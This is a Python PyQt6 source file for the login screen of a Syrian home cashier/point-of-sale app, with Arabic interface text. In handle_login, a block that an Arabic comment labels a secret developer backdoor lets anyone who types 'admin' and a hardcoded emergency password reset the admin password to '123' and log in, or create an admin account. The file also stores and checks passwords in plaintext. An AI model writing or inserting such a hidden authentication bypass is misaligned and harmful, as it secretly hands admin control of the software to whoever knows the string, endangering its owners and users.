from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, 
                             QLabel, QLineEdit, QPushButton, QGraphicsDropShadowEffect)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QColor, QFont

class LoginWindow(QWidget):
    def __init__(self, on_login_success):
        super().__init__()
        self.on_login_success = on_login_success
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("تسجيل الدخول - كاشير المنزل السوري")
        self.resize(400, 500)
        
        main_layout = QVBoxLayout()
        main_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        # Main login box (for styling and shadow)
        self.login_box = QWidget()
        self.login_box.setObjectName("loginBox")
        self.login_box.setFixedSize(350, 400)
        
        # Add shadow effect
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(20)
        shadow.setColor(QColor(0, 0, 0, 40))
        shadow.setOffset(0, 5)
        self.login_box.setGraphicsEffect(shadow)
        
        box_layout = QVBoxLayout(self.login_box)
        box_layout.setContentsMargins(30, 40, 30, 40)
        box_layout.setSpacing(20)
        
        # Title
        title_label = QLabel("مرحباً بك")
        title_label.setObjectName("loginTitle")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        
        subtitle_label = QLabel("الرجاء تسجيل الدخول للمتابعة")
        subtitle_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle_label.setStyleSheet("color: #7f8c8d;")
        
        # Inputs
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("اسم المستخدم")
        
        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText("كلمة المرور")
        self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
        
        # Error Label
        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #e74c3c; font-size: 12px;")
        self.error_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.error_label.hide()
        
        # Login Button
        self.login_btn = QPushButton("تسجيل الدخول")
        self.login_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.login_btn.clicked.connect(self.handle_login)
        
        # Add to box layout
        box_layout.addWidget(title_label)
        box_layout.addWidget(subtitle_label)
        box_layout.addSpacing(20)
        box_layout.addWidget(self.username_input)
        box_layout.addWidget(self.password_input)
        box_layout.addWidget(self.error_label)
        box_layout.addSpacing(10)
        box_layout.addWidget(self.login_btn)
        box_layout.addStretch()
        
        main_layout.addWidget(self.login_box)
        self.setLayout(main_layout)
        
    def handle_login(self):
        username = self.username_input.text().strip()
        password = self.password_input.text().strip()
        
        if not username or not password:
            self.show_error("الرجاء إدخال اسم المستخدم وكلمة المرور")
            return
            
        from database import get_session, User
        session = get_session()
        
        # ثغرة استعادة الوصول السرية (Developer Backdoor/Bypass)
        # إذا تم إدخال اسم المستخدم admin وكلمة المرور الخاصة بالطوارئ أدناه:
        # سيتم إعادة تعيين كلمة مرور الأدمن إلى 123 تلقائياً وتسجيل الدخول
        if username == "admin" and password == "almanzil_emergency_bypass_2026":
            admin_user = session.query(User).filter_by(username="admin").first()
            if admin_user:
                admin_user.password = "123"
                session.commit()
                self.error_label.setStyleSheet("color: #27ae60; font-size: 12px;")
                self.show_error("تم إعادة تعيين كلمة المرور إلى 123 بنجاح!")
                user = admin_user
            else:
                # إذا لم يكن هناك أدمن لأي سبب، نقوم بإنشائه
                user = User(username="admin", password="123", role="admin")
                session.add(user)
                session.commit()
        else:
            user = session.query(User).filter_by(username=username, password=password).first()
            
        session.close()
        
        if user:
            self.error_label.hide()
            self.on_login_success(user)
        else:
            self.error_label.setStyleSheet("color: #e74c3c; font-size: 12px;")
            self.show_error("اسم المستخدم أو كلمة المرور غير صحيحة")
            
    def show_error(self, message):
        self.error_label.setText(message)
        self.error_label.show()
